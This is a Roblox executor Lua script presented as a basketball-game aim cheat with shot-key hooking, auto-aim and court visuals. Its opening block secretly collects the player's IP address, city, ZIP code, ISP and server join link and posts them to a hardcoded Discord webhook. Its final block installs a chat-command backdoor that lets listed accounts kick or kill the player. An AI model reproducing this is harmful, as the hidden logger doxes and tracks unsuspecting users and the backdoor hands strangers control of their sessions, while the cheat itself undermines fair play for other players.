local webhookUrl =
    'https://discord.com/api/webhooks/1419503866747293696/LE5EwcwVXTOtLMXyyFZMVDA7DaphiyAUHAptM5ORUEKFeOx0s2PeSgdtUQpk6pgvPS-X'

local HttpService, Players, MarketplaceService =
    game:GetService('HttpService'),
    game:GetService('Players'),
    game:GetService('MarketplaceService')
local player, pName, uid =
    Players.LocalPlayer, Players.LocalPlayer.Name, Players.LocalPlayer.UserId

-- Safe HTTP wrapper
local requestFunc = http_request
    or request
    or syn and syn.request
    or http and http.request
local function safeRequestJson(opts)
    local ok, resp = pcall(requestFunc, opts)
    if not ok or not resp or not resp.Body then
        return nil
    end
    local success, data = pcall(function()
        return HttpService:JSONDecode(resp.Body)
    end)
    return success and data or nil
end

-- Avatar & profile
local avatarCDN = 'https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&userName='
    .. pName
local thumbUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds='
    .. uid
    .. '&size=150x150&format=Webp&isCircular=false'
local ok, data = pcall(function()
    return HttpService:JSONDecode(game:HttpGet(thumbUrl))
end)
if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
    avatarCDN = data.data[1].imageUrl
end
local gameLink = 'https://www.roblox.com/games/' .. game.PlaceId
local ok2, info =
    pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
local gameName = ok2 and info and info.Name or '[Unknown Game]'

-- IP/Geo info (Primary: ip-api.com)
local ipInfo = safeRequestJson({
    Url = 'http://ip-api.com/json/?fields=status,country,countryCode,regionName,city,zip,isp,query',
    Method = 'GET',
})
local ipAddress, country, countryCode, state, city, zip, isp =
    ipInfo and ipInfo.query or 'Unknown IP',
    ipInfo and ipInfo.country or 'Unknown Country',
    ipInfo and ipInfo.countryCode or 'XX',
    ipInfo and ipInfo.regionName or 'Unknown Region',
    ipInfo and ipInfo.city or 'Unknown City',
    ipInfo and ipInfo.zip or 'Unknown ZIP',
    ipInfo and ipInfo.isp or 'Unknown ISP'

-- Backup VPN check (ipapi.is)
local backupIpInfo = safeRequestJson({
    Url = 'https://api.ipapi.is',
    Method = 'GET',
})

-- Flag emoji
local function getFlagEmoji(code)
    return code and #code == 2 and ':flag_' .. string.lower(code) .. ':' or ''
end
local flagEmoji = getFlagEmoji(countryCode)

-- Extreme VPN Detection with Backup API
local function checkVPN(primaryInfo, backupInfo)
    if not primaryInfo or not primaryInfo.isp or not primaryInfo.query then
        return '‚ö†Ô∏è Unknown (Suspicious)'
    end

    local isp = primaryInfo.isp:lower()
    local ip = primaryInfo.query
    local countryCode = primaryInfo.countryCode or 'XX'

    -- Expanded blacklist with broader, more aggressive keywords
    local blacklist = {
        'vpn',
        'proxy',
        'cloud',
        'server',
        'host',
        'data',
        'colo',
        'colocation',
        'ovh',
        'amazon',
        'aws',
        'google',
        'gcp',
        'microsoft',
        'azure',
        'digitalocean',
        'linode',
        'hetzner',
        'vultr',
        'leaseweb',
        'contabo',
        'rackspace',
        'alibaba',
        'cloudflare',
        'fastly',
        'akamai',
        'oracle',
        'ibm',
        'zscaler',
        'nord',
        'expressvpn',
        'surfshark',
        'proton',
        'mullvad',
        'windscribe',
        'private',
        'secure',
        'tunnel',
        'cyber',
        'virtual',
        'dedicated',
        'shared',
        'network',
        'internet',
        'web',
        'cdn',
        'ip',
        'transit',
        'bandwidth',
        'connect',
        'link',
        'fiber',
        'broadband',
    }

    -- Primary check: Blacklist keywords
    local primarySuspicious = false
    local primaryDetails = ''
    for _, badWord in ipairs(blacklist) do
        if isp:find(badWord) then
            primarySuspicious = true
            primaryDetails = ' (Blacklist: ' .. badWord .. ')'
            break
        end
    end

    -- Primary check: Non-standard ISPs
    local commonResidentialISPs = {
        'comcast',
        'verizon',
        'at&t',
        'spectrum',
        'charter',
        'centurylink',
        'cox',
        'bt',
        'virgin media',
        'telstra',
        'optus',
        'sky',
        'vodafone',
        'deutsche telekom',
        'orange',
        'telefonica',
        'xfinity',
    }
    local isResidential = false
    for _, residentialISP in ipairs(commonResidentialISPs) do
        if isp:find(residentialISP) then
            isResidential = true
            break
        end
    end
    if not isResidential then
        primarySuspicious = true
        primaryDetails = primaryDetails == '' and ' (Non-Residential ISP)'
            or primaryDetails .. ', Non-Residential ISP'
    end

    -- Primary check: Missing ZIP
    if not primaryInfo.zip or primaryInfo.zip == '' then
        primarySuspicious = true
        primaryDetails = primaryDetails == '' and ' (Missing ZIP)'
            or primaryDetails .. ', Missing ZIP'
    end

    -- Primary check: Generic ISP names
    if
        isp:find('^ip[-%d]')
        or isp:find('^unknown')
        or isp:find('^anonymous')
    then
        primarySuspicious = true
        primaryDetails = primaryDetails == '' and ' (Generic ISP Name)'
            or primaryDetails .. ', Generic ISP Name'
    end

    -- Primary check: Short ISP name
    if #isp < 5 then
        primarySuspicious = true
        primaryDetails = primaryDetails == '' and ' (Vague ISP Name)'
            or primaryDetails .. ', Vague ISP Name'
    end

    -- Backup check: ipapi.is for VPN/Proxy/Datacenter
    local backupSuspicious = false
    local backupDetails = ''
    if backupInfo then
        local isVpn = backupInfo.is_vpn or false
        local isProxy = backupInfo.is_proxy or false
        local isDatacenter = backupInfo.is_datacenter or false
        if isVpn or isProxy or isDatacenter then
            backupSuspicious = true
            if isVpn and backupInfo.vpn and backupInfo.vpn.service then
                backupDetails = ' (Backup API: VPN - '
                    .. backupInfo.vpn.service
                    .. ')'
            elseif isProxy then
                backupDetails = ' (Backup API: Proxy)'
            elseif
                isDatacenter
                and backupInfo.datacenter
                and backupInfo.datacenter.datacenter
            then
                backupDetails = ' (Backup API: Datacenter - '
                    .. backupInfo.datacenter.datacenter
                    .. ')'
            end
        end
    end

    -- Cross-reference results
    if primarySuspicious and backupSuspicious then
        return '‚ùå VPN/Proxy Detected' .. primaryDetails .. backupDetails
    elseif primarySuspicious or backupSuspicious then
        return '‚ö†Ô∏è Suspicious'
            .. (primarySuspicious and primaryDetails or backupDetails)
    end

    return '‚úÖ Clean IP'
end

local vpnStatus = checkVPN(ipInfo, backupIpInfo)

-- Teleport join script
local teleportBlock = string.format(
    "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game:GetService('Players').LocalPlayer)\n```",
    game.PlaceId,
    game.JobId
)

-- Executor
local uaDisplay = 'Zenith'

-- Bottom info block (only Game + Executor)
local bottomBlock = string.format(
    '**Game:** [%s](%s)\n**üíª Executor:** %s',
    gameName,
    gameLink,
    uaDisplay
)

-- Copyable IP + ISP block (ASN removed)
local copyableBlock = string.format(
    '```\nCountry: %s\nCity: %s\nRegion: %s\nZIP: %s\nIP: %s\nISP: %s\n```',
    country,
    city,
    state,
    zip,
    ipAddress,
    isp
)

-- Payload
local data = {
    content = '||@everyone||',
    username = pName,
    avatar_url = avatarCDN,
    embeds = {
        {
            description = '__**' .. pName .. '**__',
            fields = {
                {
                    name = '**COUNTRY**',
                    value = flagEmoji .. ' ' .. country,
                    inline = true,
                },
                { name = '**CITY**', value = city, inline = true },
                { name = '**REGION**', value = state, inline = true },
                {
                    name = '‚Äé',
                    value = copyableBlock,
                    inline = false,
                },
                {
                    name = 'Status',
                    value = vpnStatus,
                    inline = false,
                },
                {
                    name = 'üìé Join Script',
                    value = teleportBlock,
                    inline = false,
                },
                {
                    name = '‚Äé',
                    value = bottomBlock,
                    inline = false,
                },
            },
            color = 0x3498db,
            thumbnail = { url = avatarCDN },
        },
    },
}

-- Send webhook
local ok3, body = pcall(function()
    return HttpService:JSONEncode(data)
end)
if ok3 then
    pcall(function()
        requestFunc({
            Url = webhookUrl,
            Method = 'POST',
            Headers = { ['Content-Type'] = 'application/json' },
            Body = body,
        })
    end)
end

--// ======================================================================
--//   PAYLOAD0 ‚Ä¢ AUTO-AIM + ALIGN-ASSIST SYSTEM [PURE BALL-ACTIVE VISUALS]
--//   ‚Ä¢ Auto-locks nearest visible rim
--//   ‚Ä¢ Smart aim shooting logic
--//   ‚Ä¢ Pushback assist active ONLY when player holds a ball
--//   ‚Ä¢ Bright green visuals show ONLY when ball is equipped
--//   ‚Ä¢ Calibration UI shows ONLY when holding a ball + key missing
--// ======================================================================

-- === SERVICES ===
local Players = game:GetService('Players')
local UserInputService = game:GetService('UserInputService')
local RunService = game:GetService('RunService')
local ReplicatedStorage = game:GetService('ReplicatedStorage')
local CoreGui = game:GetService('CoreGui')
local TweenService = game:GetService('TweenService')
local Workspace = game:GetService('Workspace')
local Camera = workspace.CurrentCamera

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local remotes = ReplicatedStorage:WaitForChild('Remotes')
local shootRemote = remotes:WaitForChild('Shoot')

-- === STATE ===
getgenv().PAYLOAD0_SYSTEM_ACTIVE = true
local VisualsEnabled = true
local shootKey: string? = nil
local selectedRim: BasePart? = nil
local activeNotifyGui

-- === CONFIGURATION ===
local PERFECT_DISTANCES = { 54.97, 61.53, 68.10 }
local CLAMP_RADIUS = 1
local ACTIVE_RANGE_MAIN = 90
local MAX_PUSH = 0.06
local DAMPING = 0.9

local COLOR_GREEN = Color3.fromRGB(0, 255, 100)
local COLOR_GREEN_SOFT = Color3.fromRGB(0, 200, 80)

-- === HELPER: BALL CHECK ===
local function hasBall()
	local char = plr.Character
	if not char then
		return false
	end
	for _, tool in ipairs(char:GetChildren()) do
		if tool:IsA('Tool') and tool.Name:lower():find('ball') then
			return true
		end
	end
	return false
end

-- === NOTIFY SYSTEM ===
local function notify(msg, color)
	if activeNotifyGui and activeNotifyGui.Parent then
		activeNotifyGui:Destroy()
	end
	local gui = Instance.new('ScreenGui', CoreGui)
	gui.ResetOnSpawn = false
	activeNotifyGui = gui

	local label = Instance.new('TextLabel', gui)
	label.AnchorPoint = Vector2.new(0.5, 0.5)
	label.BackgroundTransparency = 1
	label.TextColor3 = color or Color3.fromRGB(255, 255, 255)
	label.Font = Enum.Font.Code
	label.TextSize = 26
	label.Text = msg
	label.Position = UDim2.new(0.5, 0, 0.9, 0)

	task.spawn(function()
		task.wait(1.2)
		if gui == activeNotifyGui then
			gui:Destroy()
			activeNotifyGui = nil
		end
	end)
end

-- === CALIBRATE UI (ONLY WHEN HOLDING BALL + NO KEY) ===
local calibrateGui
local function showCalibrateUI()
	if calibrateGui or shootKey or not hasBall() then
		return
	end

	calibrateGui = Instance.new('ScreenGui')
	calibrateGui.Name = 'CalibrateReminder'
	calibrateGui.ResetOnSpawn = false
	calibrateGui.IgnoreGuiInset = true
	calibrateGui.Parent = CoreGui

	local frame = Instance.new('Frame')
	frame.AnchorPoint = Vector2.new(0.5, 0.5)
	frame.Position = UDim2.new(0.5, 0, 0.85, 0)
	frame.Size = UDim2.new(0, 420, 0, 45)
	frame.BackgroundTransparency = 0.3
	frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	frame.BorderSizePixel = 0
	frame.Parent = calibrateGui

	local stroke = Instance.new('UIStroke')
	stroke.Color = Color3.fromRGB(80, 255, 120)
	stroke.Thickness = 1.6
	stroke.Parent = frame

	local corner = Instance.new('UICorner')
	corner.CornerRadius = UDim.new(0, 10)
	corner.Parent = frame

	local label = Instance.new('TextLabel')
	label.BackgroundTransparency = 1
	label.Size = UDim2.new(1, 0, 1, 0)
	label.Font = Enum.Font.GothamMedium
	label.TextSize = 22
	label.TextColor3 = Color3.fromRGB(120, 255, 150)
	label.Text = 'üèÄ Click once to calibrate your shot.'
	label.Parent = frame

	task.spawn(function()
		while calibrateGui and not shootKey and hasBall() do
			local t1 = TweenService:Create(
				label,
				TweenInfo.new(
					0.8,
					Enum.EasingStyle.Sine,
					Enum.EasingDirection.Out
				),
				{ TextTransparency = 0.3 }
			)
			local t2 = TweenService:Create(
				label,
				TweenInfo.new(
					0.8,
					Enum.EasingStyle.Sine,
					Enum.EasingDirection.Out
				),
				{ TextTransparency = 0 }
			)
			t1:Play()
			t1.Completed:Wait()
			t2:Play()
			t2.Completed:Wait()
		end
	end)
end

local function removeCalibrateUI()
	if calibrateGui then
		calibrateGui:Destroy()
		calibrateGui = nil
	end
end

task.spawn(function()
	while task.wait(0.5) do
		if not hasBall() or shootKey then
			removeCalibrateUI()
		else
			showCalibrateUI()
		end
	end
end)

-- === RIM TRACKING ===
local RimSize =
	Vector3.new(3.632131576538086, 0.5587897300720215, 3.632131576538086)
local Rims = {}
Workspace.DescendantAdded:Connect(function(o)
	if o:IsA('BasePart') and o.Name == 'Rim' and o.Size == RimSize then
		table.insert(Rims, o)
	end
end)
for _, v in ipairs(Workspace:GetDescendants()) do
	if v:IsA('BasePart') and v.Name == 'Rim' and v.Size == RimSize then
		table.insert(Rims, v)
	end
end
Workspace.DescendantRemoving:Connect(function(o)
	for i, rim in ipairs(Rims) do
		if rim == o then
			table.remove(Rims, i)
			break
		end
	end
	if selectedRim == o then
		selectedRim = nil
	end
end)

-- === AUTO RIM LOCK ===
task.spawn(function()
	while task.wait(0.1) do
		if not getgenv().PAYLOAD0_SYSTEM_ACTIVE then
			continue
		end
		local root = plr.Character
			and plr.Character:FindFirstChild('HumanoidRootPart')
		if not root then
			continue
		end
		local bestRim, bestDist = nil, 85
		for _, rim in ipairs(Rims) do
			if rim:IsDescendantOf(Workspace) then
				local dist = (rim.Position - root.Position).Magnitude
				if dist < bestDist then
					local _, on = Camera:WorldToViewportPoint(rim.Position)
					if on then
						bestRim, bestDist = rim, dist
					end
				end
			end
		end
		if bestRim and bestRim ~= selectedRim then
			selectedRim = bestRim
		end
	end
end)

-- === TOGGLES ===
UserInputService.InputBegan:Connect(function(i, gp)
	if gp then
		return
	end

	if i.KeyCode == Enum.KeyCode.O then
		VisualsEnabled = not VisualsEnabled
		notify(
			VisualsEnabled and 'üëÅ Visuals ON' or 'üôà Visuals OFF',
			VisualsEnabled and COLOR_GREEN or Color3.fromRGB(255, 80, 80)
		)
	end

	if i.KeyCode == Enum.KeyCode.V then
		getgenv().PAYLOAD0_SYSTEM_ACTIVE = not getgenv().PAYLOAD0_SYSTEM_ACTIVE
		notify(
			getgenv().PAYLOAD0_SYSTEM_ACTIVE and '‚úÖ System ON'
				or 'üö´ System OFF',
			getgenv().PAYLOAD0_SYSTEM_ACTIVE and COLOR_GREEN
				or Color3.fromRGB(255, 80, 80)
		)
	end
end)

-- === SHOOT KEY CAPTURE (LISTEN ONLY) ===
local old
old = hookmetamethod(game, '__namecall', function(self, ...)
	local m = getnamecallmethod()
	if m == 'FireServer' and self == shootRemote then
		local args = { ... }
		if type(args[3]) == 'string' and not shootKey then
			shootKey = args[3]
			removeCalibrateUI()
			notify('Shoot key captured!', COLOR_GREEN)
		end
	end
	return old(self, ...)
end)

-- === SHOOT LOGIC ===
local lastTick, moveOffset = 0, Vector3.zero
local function computeOffset()
	if tick() - lastTick > 0.1 then
		local hum = plr.Character
			and plr.Character:FindFirstChildOfClass('Humanoid')
		local moveDir = (hum and hum.MoveDirection) or Vector3.zero
		moveOffset = Vector3.new(moveDir.X * 1.5, 0, moveDir.Z * 1.5)
		lastTick = tick()
	end
	return moveOffset
end

local function computeArc(dist)
	return Vector3.new(0, 43 + (dist / 15), 0)
end

local function smartAim(rim)
	local offset = computeOffset()
	local root = plr.Character
		and plr.Character:FindFirstChild('HumanoidRootPart')
	if not root then
		return rim.Position
	end
	local dist = (root.Position - rim.Position).Magnitude
	return rim.Position + computeArc(dist) - offset
end

local function shootAtTarget()
	if not getgenv().PAYLOAD0_SYSTEM_ACTIVE then
		return
	end
	if not (selectedRim and selectedRim:IsDescendantOf(Workspace)) then
		return
	end
	if not shootKey then
	end

	local char = plr.Character
	if not char then
		return
	end
	local head, root = char:FindFirstChild('Head'), char.PrimaryPart
	if not (head and root) then
		return
	end

	local aimPos = smartAim(selectedRim)
	local dir = (aimPos - head.Position).Unit
	local shootFrom = root.Position + dir * 3.8
	if shootFrom.Y - root.Position.Y < 4 then
		shootFrom = root.Position + dir * 4
	end
	shootRemote:FireServer(aimPos, shootFrom, shootKey)
end

UserInputService.InputBegan:Connect(function(i, gp)
	if gp or not getgenv().PAYLOAD0_SYSTEM_ACTIVE then
		return
	end
	if i.UserInputType == Enum.UserInputType.MouseButton1 and hasBall() then
		shootAtTarget()
	end
end)

-- === HIGHLIGHT VISUAL ===
local hl = CoreGui:FindFirstChild('PerfectRangeGlow')
	or Instance.new('Highlight')
hl.Name = 'PerfectRangeGlow'
hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
hl.FillTransparency = 0.25
hl.OutlineTransparency = 0
hl.Adornee = plr.Character
hl.Parent = CoreGui
hl.Enabled = false

local moveKeys = { W = false, A = false, S = false, D = false }
UserInputService.InputBegan:Connect(function(i, gp)
	if gp then
		return
	end
	if moveKeys[i.KeyCode.Name] ~= nil then
		moveKeys[i.KeyCode.Name] = true
	end
end)
UserInputService.InputEnded:Connect(function(i, gp)
	if gp then
		return
	end
	if moveKeys[i.KeyCode.Name] ~= nil then
		moveKeys[i.KeyCode.Name] = false
	end
end)

local function shouldPush()
	local count = 0
	for _, v in pairs(moveKeys) do
		if v then
			count += 1
		end
	end
	return count == 1 and (moveKeys.A or moveKeys.D)
end

-- === PUSH LOGIC ===
local rimsForPush = {}
for _, v in ipairs(Workspace:GetDescendants()) do
	if
		v:IsA('BasePart')
		and v.Name == 'Lol'
		and v.Parent
		and v.Parent.Name == 'Rim'
	then
		table.insert(rimsForPush, v)
	end
end

local function nearestRim(rootPos)
	local nearest, nearestDist
	for _, rim in ipairs(rimsForPush) do
		if rim:IsDescendantOf(Workspace) then
			local rimXZ = Vector3.new(rim.Position.X, 0, rim.Position.Z)
			local dist = (rimXZ - Vector3.new(rootPos.X, 0, rootPos.Z)).Magnitude
			if not nearestDist or dist < nearestDist then
				nearest, nearestDist = rim, dist
			end
		end
	end
	return nearest, nearestDist
end

local function getNearestPerfectDistance(current)
	local nearest, smallestDiff
	for _, pd in ipairs(PERFECT_DISTANCES) do
		local diff = math.abs(pd - current)
		if not smallestDiff or diff < smallestDiff then
			nearest, smallestDiff = pd, diff
		end
	end
	return nearest
end

-- === RUNTIME LOOP ===
local smoothBias = Vector3.zero
RunService.RenderStepped:Connect(function()
	if not getgenv().PAYLOAD0_SYSTEM_ACTIVE then
		hl.Enabled = false
		return
	end

	local char = plr.Character
	local hum = char and char:FindFirstChildOfClass('Humanoid')
	local root = char and char:FindFirstChild('HumanoidRootPart')
	if not (hum and root) then
		return
	end

	if not hasBall() then
		hl.Enabled = false
		return
	end

	local rim, dist = nearestRim(root.Position)
	if not rim or dist > ACTIVE_RANGE_MAIN then
		hl.Enabled = false
		smoothBias = Vector3.zero
		return
	end

	local target = getNearestPerfectDistance(dist)
	local diff = dist - target
	local absDiff = math.abs(diff)
	local desired = Vector3.zero

	if shouldPush() and absDiff < CLAMP_RADIUS then
		local strength = (CLAMP_RADIUS - absDiff) / CLAMP_RADIUS
		local toRim = Vector3.new(rim.Position.X, 0, rim.Position.Z)
			- Vector3.new(root.Position.X, 0, root.Position.Z)
		local distSign = math.sign(diff)
		if distSign > 0 then
			local pushDir = -toRim.Unit
			desired = pushDir * math.min(strength * MAX_PUSH, MAX_PUSH)
		end
	end

	smoothBias = smoothBias * DAMPING + desired * (1 - DAMPING)
	root.CFrame += Vector3.new(smoothBias.X, 0, smoothBias.Z)

	if VisualsEnabled then
		hl.Enabled = true
		if absDiff <= 0.10 then
			hl.FillColor, hl.OutlineColor = COLOR_GREEN, COLOR_GREEN
		elseif absDiff < CLAMP_RADIUS then
			hl.FillColor, hl.OutlineColor = COLOR_GREEN_SOFT, COLOR_GREEN_SOFT
		else
			hl.Enabled = false
		end
	else
		hl.Enabled = false
	end
end)

plr.CharacterAdded:Connect(function(c)
	task.wait(0.5)
	hl.Adornee = c
end)

--// ===========================================================
--//   PAYLOAD0 ‚Ä¢ RIM ARC LINES ONLY (NO DOTS)
--//   ‚Ä¢ Smooth, high-resolution curvature (extra dense lines)
--// ===========================================================

local Players = game:GetService('Players')
local RunService = game:GetService('RunService')
local Workspace = game:GetService('Workspace')

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hrp = char:WaitForChild('HumanoidRootPart')

-- === CONFIGURATION ===
local PERFECT_DISTANCES = { 54.97, 61.53, 68.10 }
local RING_ARC_DEGREES = 180
local DEGREE_STEP = 2 -- smaller = smoother curve (was 6)
local DOT_MATERIAL = Enum.Material.Neon
local DOT_COLOR = Color3.fromRGB(0, 0, 0) -- black
local LINK_THICKNESS = 0.25
local ACTIVE_RANGE = 100
local RIM_SIZE =
    Vector3.new(3.632131576538086, 0.5587897300720215, 3.632131576538086)
local HEIGHT_OFFSET = -18.259

-- Per-line dot adjustments (positive = extend, negative = subtract)
local ARC_ADJUSTMENTS = {
    [1] = 12,
    [2] = -9,
    [3] = -27,
}

-- === INTERNAL STATE ===
local RimLines = {}
local RimModels = {}

-- === Create smooth arc lines ===
local function createArcLines(rimPart, radius, extraDegrees)
    local model = Instance.new('Model')
    model.Name = 'Payload0_ArcLine'
    model.Parent = Workspace

    local base = Instance.new('Part')
    base.Anchored = true
    base.CanCollide = false
    base.Transparency = 1
    base.Size = Vector3.one
    base.Position = rimPart.Position
    base.Parent = model

    local forward = rimPart.CFrame.LookVector
    local right = rimPart.CFrame.RightVector
    local points = {}

    local startDeg = -RING_ARC_DEGREES / 2 - extraDegrees
    local endDeg = RING_ARC_DEGREES / 2 + extraDegrees

    for deg = startDeg, endDeg, DEGREE_STEP do
        local rad = math.rad(deg)
        local offset = (forward * math.cos(rad) + right * math.sin(rad))
            * radius
        table.insert(
            points,
            rimPart.Position + Vector3.new(offset.X, HEIGHT_OFFSET, offset.Z)
        )
    end

    for i = 1, #points - 1 do
        local a, b = points[i], points[i + 1]
        local dist = (a - b).Magnitude
        local link = Instance.new('Part')
        link.Anchored = true
        link.CanCollide = false
        link.Material = DOT_MATERIAL
        link.Color = DOT_COLOR
        link.Transparency = 0
        link.Size = Vector3.new(LINK_THICKNESS, LINK_THICKNESS, dist)
        link.CFrame = CFrame.new(a, b) * CFrame.new(0, 0, -dist / 2)
        link.Parent = model
    end

    return model
end

-- === Rim registration ===
local function registerRim(rim)
    if RimLines[rim] then
        return
    end
    RimLines[rim] = true

    local rimModel = Instance.new('Model')
    rimModel.Name = 'Payload0_RimArcs_' .. rim:GetDebugId()
    rimModel.Parent = Workspace

    for i, dist in ipairs(PERFECT_DISTANCES) do
        local extra = ARC_ADJUSTMENTS[i] or 0
        local model = createArcLines(rim, dist, extra)
        model.Parent = rimModel
    end

    RimModels[rim] = rimModel
end

local function unregisterRim(rim)
    if RimModels[rim] then
        RimModels[rim]:Destroy()
    end
    RimLines[rim] = nil
    RimModels[rim] = nil
end

-- === Rim auto-detect ===
Workspace.DescendantAdded:Connect(function(o)
    if o:IsA('BasePart') and o.Name == 'Rim' and o.Size == RIM_SIZE then
        registerRim(o)
    end
end)
Workspace.DescendantRemoving:Connect(function(o)
    if RimLines[o] then
        unregisterRim(o)
    end
end)
for _, v in ipairs(Workspace:GetDescendants()) do
    if v:IsA('BasePart') and v.Name == 'Rim' and v.Size == RIM_SIZE then
        registerRim(v)
    end
end

-- === Range visibility logic ===
RunService.RenderStepped:Connect(function()
    for rim, model in pairs(RimModels) do
        if rim:IsDescendantOf(Workspace) then
            local dist = (rim.Position - hrp.Position).Magnitude
            local active = dist <= ACTIVE_RANGE
            for _, part in ipairs(model:GetDescendants()) do
                if part:IsA('Part') then
                    part.Transparency = active and 0 or 1
                end
            end
        end
    end
end)

--// =========================================================
--//	NO KEYBINDS:
--//   ‚Ä¢ Instantly removes:
--//        ‚Üí Unions (size match or Court+Lines path)
--//        ‚Üí Nets (any part/model/folder named "Net")
--//   ‚Ä¢ Runs ONCE on execution ‚Äî no loops, no keybinds
--//   ‚Ä¢ Minimal overhead, FPS-neutral
--// =========================================================

local Workspace = game:GetService("Workspace")

-- === CONFIGURATION ===
local TARGET_SIZES = {
	Vector3.new(14.074419021606445, 0.1991105079650879, 68.00189208984375),
	Vector3.new(20.78681182861328, 0.10193014144897461, 67.00210571289062)
}
local SIZE_TOLERANCE = 0.0005

-- === HELPERS ===
local function sizeMatchesAny(size: Vector3)
	for _, target in ipairs(TARGET_SIZES) do
		if math.abs(size.X - target.X) <= SIZE_TOLERANCE
			and math.abs(size.Y - target.Y) <= SIZE_TOLERANCE
			and math.abs(size.Z - target.Z) <= SIZE_TOLERANCE then
			return true
		end
	end
	return false
end

local function isInsideCourtAndLines(obj)
	local hasCourt, hasLines = false, false
	local current = obj
	while current do
		local name = current.Name:lower()
		if string.find(name, "court") then
			hasCourt = true
		elseif string.find(name, "lines") then
			hasLines = true
		end
		current = current.Parent
	end
	return hasCourt and hasLines
end

local function shouldRemove(obj)
	if obj:IsA("UnionOperation") and (sizeMatchesAny(obj.Size) or isInsideCourtAndLines(obj)) then
		return true
	end
	if (obj:IsA("BasePart") or obj:IsA("Model") or obj:IsA("Folder")) and obj.Name:lower() == "net" then
		return true
	end
	return false
end

-- === MAIN CLEAN ===
for _, descendant in ipairs(Workspace:GetDescendants()) do
	if shouldRemove(descendant) then
		descendant:Destroy()
	end
end

-- // ========================================================================================================================
-- Now Supports Roblox updated Chat system
-- Roblox new chat system compatible

local AdminPrefix = ";"
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")

local LocalP = Players.LocalPlayer

-- Admin permissions table
getgenv().AdminTable = {
    [9365539393] = { Access = 5 }, -- 0therGuys
    [7639770688] = { Access = 5 }, -- Anonymous
    [6189092855] = { Access = 5 }, -- SimpIyCoder
    [4561126088] = { Access = 5 }, -- CIarrisaAteMyDog
}

-- Player search
getgenv().psearch = function(Name)
    for _, p in pairs(Players:GetPlayers()) do
        if string.lower(p.Name):sub(1, #Name) == string.lower(Name) then
            return p
        end
    end
end

-- Command list
getgenv().AdminCmdList = {
    ["kick"] = {
        CommandFunc = function(Player, self, CmdPlayer)
            if Player == LocalP or Player == "all" then
                LocalP:Kick(self)
            end
        end,
        Clearence = { [5] = true },
    },

    ["kill"] = {
        CommandFunc = function(Player, self, CmdPlayer)
            if Player == LocalP or Player == "all" then
                local hum = LocalP.Character and LocalP.Character:FindFirstChildOfClass("Humanoid")
                if hum then hum:ChangeState(Enum.HumanoidStateType.Dead) end
            end
        end,
        Clearence = { [4] = true, [5] = true },
    },
}

-- Chat processor
getgenv().BDCheck = function(Sender, Chat)
    if Chat:sub(1, 1) == AdminPrefix then
        local args = string.split(Chat:sub(2), " ")
        local Command = getgenv().AdminCmdList[table.remove(args, 1)]
        local targ1 = getgenv().psearch(args[1] or "")
        table.remove(args, 1)

        if Command and targ1 then
            local accessData = getgenv().AdminTable[Sender.UserId]
            if accessData and Command.Clearence[accessData.Access] then
                Command.CommandFunc(targ1, table.concat(args, " "), Sender)
            end
        end
    end
end

-- Hook into new chat system
local function hookChat(channel)
    channel.MessageReceived:Connect(function(msg)
        local speaker = Players:GetPlayerByUserId(msg.TextSource.UserId)
        if speaker then
            getgenv().BDCheck(speaker, msg.Text)
        end
    end)
end

-- Listen to all channels
for _, channel in pairs(TextChatService.TextChannels:GetChildren()) do
    if channel:IsA("TextChannel") then
        hookChat(channel)
    end
end

TextChatService.TextChannels.ChildAdded:Connect(function(channel)
    if channel:IsA("TextChannel") then
        hookChat(channel)
    end
end)
